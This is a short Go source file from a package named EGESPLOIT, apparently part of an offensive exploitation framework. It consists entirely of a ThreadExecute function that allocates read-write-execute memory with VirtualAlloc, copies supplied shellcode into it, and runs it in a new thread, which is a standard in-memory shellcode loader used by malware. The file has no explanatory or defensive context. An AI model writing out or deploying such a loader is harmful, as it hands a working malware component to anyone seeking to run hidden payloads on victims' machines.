package EGESPLOIT

import "unsafe"


func ThreadExecute(Shellcode []byte) {

	Addr, _, _ := VirtualAlloc.Call(0, uintptr(len(Shellcode)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
	
	AddrPtr := (*[990000]byte)(unsafe.Pointer(Addr))

	for i := 0; i < len(Shellcode); i++ {
		AddrPtr[i] = Shellcode[i]
	}

	ThreadAddr, _, _ := CreateThread.Call(0, 0, Addr, 0, 0, 0)

	WaitForSingleObject.Call(ThreadAddr, 0xFFFFFFFF)
}